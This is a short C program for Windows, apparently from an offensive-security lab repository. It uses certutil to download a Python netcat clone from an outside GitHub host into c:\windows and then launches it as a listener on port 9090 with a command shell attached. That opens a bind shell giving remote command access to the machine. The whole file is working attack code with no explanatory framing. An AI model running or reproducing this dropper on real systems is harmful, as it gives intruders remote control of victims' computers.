#include <stdlib.h>
#include <windows.h>

int main ()
{

    int i;

    i = system ("certutil -urlcache -split -f https://raw.githubusercontent.com/stackviolator/ccso-offense/main/nc.py c:\\windows\\nc.py");
    Sleep(10000); // 10 seconds (10000 milliseconds)
    i = system ("python c:\\windows\\nc.py -nlvp 9090 -l -c");

            return 0;
}
